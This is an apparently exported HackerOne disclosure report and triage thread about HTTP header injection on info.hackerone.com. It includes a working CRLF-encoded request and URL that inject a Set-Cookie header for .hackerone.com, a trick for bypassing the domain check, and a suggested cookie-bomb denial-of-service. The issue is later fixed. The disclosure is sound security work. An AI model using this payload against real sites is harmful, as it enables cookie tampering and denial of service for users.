title: HTTP header injection in info.hackerone.com allows setting cookies for hackerone.com

profile.name: HackerOne
profile.about: Vulnerability disclosure should be safe, transparent, and rewarding.

vulnerability_information:
The subdomain **info.hackerone.com** is vulnerable to HTTP header injection. I'm aware that you are only interested in critical issues affecting this subdomain.

However, you may be interested in this issue as a vulnerability in this domain may affect the domain **hackerone.com**.

The vulnerability is a classic HTTP header injection. By making the following HTTP request it's possible to inject additional HTTP headers:

```        
GET /%0d%0aset-cookie%20%3amycookie%3dmyvalue;%20%44omain%20%3d.hackerone.com HTTP/1.1
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36
Accept-Language: en-us,en;q=0.5
Host: info.hackerone.com
Cookie: BIGipServerab12web-app_https=688587018.47873.0000; BIGipServerab12web-app_http=621478154.20480.0000; __cfduid=db2a412f6305ca8dcc97a7cf06d1da6271446241668; __cfduid=d50b9d3c96413964ca4674c7ebd24ba581446241674
Accept-Encoding: gzip, deflate
```
        
This HTTP request will produce the following response:
```
HTTP/1.1 302 Found
Date: Mon, 02 Nov 2015 17:40:28 GMT
Content-Type: text/html; charset=iso-8859-1
Content-Length: 265
Connection: keep-alive
Cf-Railgun: direct (starting new WAN connection)
Location: https://info.hackerone.com/
Set-Cookie: mycookie=myvalue; Domain =.hackerone.com
Vary: Accept-Encoding
Server: cloudflare-nginx
CF-RAY: 23f19fec71ae3494-LHR
```

As you can see a new header `Set-Cookie: mycookie=myvalue; Domain =.hackerone.com` was injected in the response.  Notice the extra space after the Domain keyword? That was necessary to bypass some code that was automatically setting the cookie domain to info.hackerone.com.

Because subdomains can set cookies for the root domain, info.hackerone.com can set cookies for the main domain hackerone.com.

To reproduce, follow the next steps:
- Visit the following URL in Internet Explorer. I've reproduced with Internet Explorer 11 (exact version **11.0.9600.17691**)
 
http://info.hackerone.com/%0d%0aset-cookie%20%3amycookie%3dmyvalue;%20%44omain%20%3d.hackerone.com

- Check the cookies from the domain hackerone.com by entering Internet Explorer console mode (F12) and the console tag.

**document.cookie**
**"_ga=GA1.2.1697487504.1446486792; _gat=1; mycookie=myvalue"**

A new cookie named **mycookie** with the value **myvalue** was set.
vulnerability_information_html:
The subdomain info.hackerone.com is vulnerable to HTTP header injection. I'm aware that you are only interested in critical issues affecting this subdomain.

However, you may be interested in this issue as a vulnerability in this domain may affect the domain hackerone.com.

The vulnerability is a classic HTTP header injection. By making the following HTTP request it's possible to inject additional HTTP headers:

GET /%0d%0aset-cookie%20%3amycookie%3dmyvalue;%20%44omain%20%3d.hackerone.com HTTP/1.1
Cache-Control: no-cache
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36
Accept-Language: en-us,en;q=0.5
Host: info.hackerone.com
Cookie: BIGipServerab12web-app_https=688587018.47873.0000; BIGipServerab12web-app_http=621478154.20480.0000; __cfduid=db2a412f6305ca8dcc97a7cf06d1da6271446241668; __cfduid=d50b9d3c96413964ca4674c7ebd24ba581446241674
Accept-Encoding: gzip, deflate

This HTTP request will produce the following response:

HTTP/1.1 302 Found
Date: Mon, 02 Nov 2015 17:40:28 GMT
Content-Type: text/html; charset=iso-8859-1
Content-Length: 265
Connection: keep-alive
Cf-Railgun: direct (starting new WAN connection)
Location: https://info.hackerone.com/
Set-Cookie: mycookie=myvalue; Domain =.hackerone.com
Vary: Accept-Encoding
Server: cloudflare-nginx
CF-RAY: 23f19fec71ae3494-LHR

As you can see a new header Set-Cookie: mycookie=myvalue; Domain =.hackerone.com was injected in the response. Notice the extra space after the Domain keyword? That was necessary to bypass some code that was automatically setting the cookie domain to info.hackerone.com.

Because subdomains can set cookies for the root domain, info.hackerone.com can set cookies for the main domain hackerone.com.

To reproduce, follow the next steps:

  • Visit the following URL in Internet Explorer. I've reproduced with Internet Explorer 11 (exact version 11.0.9600.17691)

http://info.hackerone.com/%0d%0aset-cookie%20%3amycookie%3dmyvalue;%20%44omain%20%3d.hackerone.com

  • Check the cookies from the domain hackerone.com by entering Internet Explorer console mode (F12) and the console tag.

document.cookie
"_ga=GA1.2.1697487504.1446486792; _gat=1; mycookie=myvalue"

A new cookie named mycookie with the value myvalue was set.

activities.message:
Hey @harisec 

Thanks for the report, and the detailed explanation! It's always nice to get such a well presented report. This is definitely an interesting issue, and I'll be looking into it. In the interim, I was wondering whether you had a demonstration of how this could be used maliciously? Of course they a user could just set their session cookie to that of another user, but that assumes a preexisting severe issue (if you get someone else's session cookie that's already pretty scary). Do you have a specific way in mind that this could be exploited?


Thanks!


Evan
activities.markdown_message:
Hey @harisec

Thanks for the report, and the detailed explanation! It's always nice to get such a well presented report. This is definitely an interesting issue, and I'll be looking into it. In the interim, I was wondering whether you had a demonstration of how this could be used maliciously? Of course they a user could just set their session cookie to that of another user, but that assumes a preexisting severe issue (if you get someone else's session cookie that's already pretty scary). Do you have a specific way in mind that this could be exploited?

Thanks!

Evan

activities.message:
Yes, you are correct. This issue doesn't have any meaningful security impact on HackerOne. The only cookie you are using is the Rails session cookie and the value of this cookie is signed so it cannot be tampered with.
I guess you can close this issue as Informative.
activities.markdown_message:
Yes, you are correct. This issue doesn't have any meaningful security impact on HackerOne. The only cookie you are using is the Rails session cookie and the value of this cookie is signed so it cannot be tampered with.
I guess you can close this issue as Informative.

activities.message:
Agreed! Definitely informative, but not super alarming. Thanks for the report though!

Cheers!


Evan

activities.message: @harisec Sorry about the closing/reopening, but we're going to reopen and ensure this gets fixed.
activities.markdown_message: @harisec Sorry about the closing/reopening, but we're going to reopen and ensure this gets fixed.

activities.message: Hey @harisec -- just wanted to give you an update. We're working with two different third-party vendors to get this fixed (as you found two separate vulnerabilities). Sadly, things aren't moving as quickly as we would like, so taking a while to get the issues resolved. Once we have more information, we'll let you know.
activities.markdown_message: Hey @harisec -- just wanted to give you an update. We're working with two different third-party vendors to get this fixed (as you found two separate vulnerabilities). Sadly, things aren't moving as quickly as we would like, so taking a while to get the issues resolved. Once we have more information, we'll let you know.

activities.message:
p.s. just for your information (i know this report will not be rewarded)
Initially i said there is no impact on hackerone.com but there is some limited impact:

Denial of Service with Cookie Bomb
http://blog.innerht.ml/overflow-trilogy/

Scroll on the previous link to get to the second article on that page.

So, basically an attacker could set 2 cookies of 4k of data each and some change and the cookies will exceed the 8k limit on header length and the request will be rejected by the server.
Therefore, the victim could not access hackerone.com until they will delete their cookies.
I didn't tried but i think it should work.

Anyhow, just wanted to let you guys know.
activities.markdown_message:
p.s. just for your information (i know this report will not be rewarded)

So, basically an attacker could set 2 cookies of 4k of data each and some change and the cookies will exceed the 8k limit on header length and the request will be rejected by the server.
Therefore, the victim could not access hackerone.com until they will delete their cookies.
I didn't tried but i think it should work.

Anyhow, just wanted to let you guys know.

activities.message:
Hi @harisec -- we believe we have implemented several mitigations that will prevent this (and other issues like it) from being a problem in the future.

1. info.hackerone.com and go.hackerone.com have been moved to info.hacker.one and go.hacker.one.
2. Our third-party CDN provider has added a WAF rule that detects the HTTP header injection and blocks it.
3. The third-party who hosts this site has implemented a fix for the issue.

Can you confirm this has been fixed now?
activities.markdown_message:
Hi @harisec -- we believe we have implemented several mitigations that will prevent this (and other issues like it) from being a problem in the future.

  1. info.hackerone.com and go.hackerone.com have been moved to info.hacker.one and go.hacker.one.
  2. Our third-party CDN provider has added a WAF rule that detects the HTTP header injection and blocks it.
  3. The third-party who hosts this site has implemented a fix for the issue.

Can you confirm this has been fixed now?

activities.message: Yes, the issue was fixed. Great work on mitigation. Thank you very much!
activities.markdown_message: Yes, the issue was fixed. Great work on mitigation. Thank you very much!

activities.message: Thank you for the report! Please do let us know if you find anything else. We're always on the lookout for anything that could potentially impact our platform.
